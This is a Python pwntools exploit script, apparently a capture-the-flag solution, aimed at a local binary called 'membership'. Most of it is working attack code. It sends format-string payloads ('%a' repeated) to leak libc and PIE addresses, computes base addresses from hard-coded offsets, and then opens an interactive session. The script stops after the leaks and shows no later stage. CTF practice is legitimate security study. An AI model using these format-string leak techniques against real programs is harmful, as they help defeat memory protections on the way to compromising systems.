#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template membership
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('membership')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *__isoc99_scanf
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()


io.sendline("%a"*20)

io.recvuntil(b'10220x0.0')
leak = io.recvline().rstrip()
leak = b'0x' + leak.split(b'-')[0][:-1] + b'1'
leak = int(leak, 16)
base = leak - 1881761

print(f'[+] Leak: {hex(leak)}')
print(f'[+] Base: {hex(base)}')

io.sendline("%a"*20)

io.recvuntil(b'10220x0.05')
pie_leak = io.recvline().rstrip()
pie_leak = b'0x5' + pie_leak.split(b'-')[0][:-1] + b'1'

pie_leak = int(pie_leak, 16)
print(f'[+] PIE leak: {hex(pie_leak)}')

pie_base = pie_leak - 2105377
print(f'[+] PIE base: {hex(pie_base)}')


io.sendline("%08f")

io.interactive()

